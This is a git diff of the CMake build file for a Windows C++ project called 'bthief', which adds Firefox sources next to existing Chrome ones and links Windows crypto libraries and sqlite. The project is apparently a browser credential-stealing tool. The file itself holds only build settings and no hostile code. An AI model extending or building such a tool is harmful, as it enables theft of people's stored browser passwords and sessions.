@@ -1,9 +1,11 @@
 cmake_minimum_required(VERSION 3.22)
 
-# allow options to be set from variables (needed for WIL_BUILD_TESTS)
+# allow options to be set from variables
 set(CMAKE_POLICY_DEFAULT_CMP0077 NEW)
+# enable setting MSVC_RUNTIME_LIBRARY property
+set(CMAKE_POLICY_DEFAULT_CMP0091 NEW)
 
-project(bthief LANGUAGES CXX)
+project(bthief LANGUAGES CXX C)
 
 include(FetchContent)
 
@@ -30,14 +32,27 @@ message(STATUS "Getting dependencies...")
 FetchContent_MakeAvailable(wil json sqlite)
 
 
-add_executable(${PROJECT_NAME}
-               src/main.cxx
-               src/crypt.cxx
-               src/nowide.cxx
-               src/chrome.cxx
-               ${sqlite_SOURCE_DIR}/sqlite3.c)
-
-target_compile_features(${PROJECT_NAME} PUBLIC cxx_std_23)
-target_compile_definitions(${PROJECT_NAME} PRIVATE UNICODE _UNICODE WIN32_LEAN_AND_MEAN)
-target_include_directories(${PROJECT_NAME} PRIVATE ${sqlite_SOURCE_DIR})
-target_link_libraries(${PROJECT_NAME} Bcrypt Crypt32 WIL nlohmann_json::nlohmann_json)
+add_executable(bthief
+    src/main.cxx
+    src/crypt.cxx
+    src/nowide.cxx
+    src/browsers/chrome/chrome.cxx
+    src/browsers/firefox/firefox.cxx
+    src/browsers/firefox/library.cxx
+    ${sqlite_SOURCE_DIR}/sqlite3.c
+)
+set_property(TARGET bthief PROPERTY
+    MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>"
+)
+target_compile_features(bthief PRIVATE cxx_std_23)
+target_compile_options(bthief PRIVATE /W4)
+target_include_directories(bthief PRIVATE
+    src
+    ${sqlite_SOURCE_DIR}
+)
+target_link_libraries(bthief
+    Bcrypt
+    Crypt32
+    WIL::WIL
+    nlohmann_json::nlohmann_json
+)
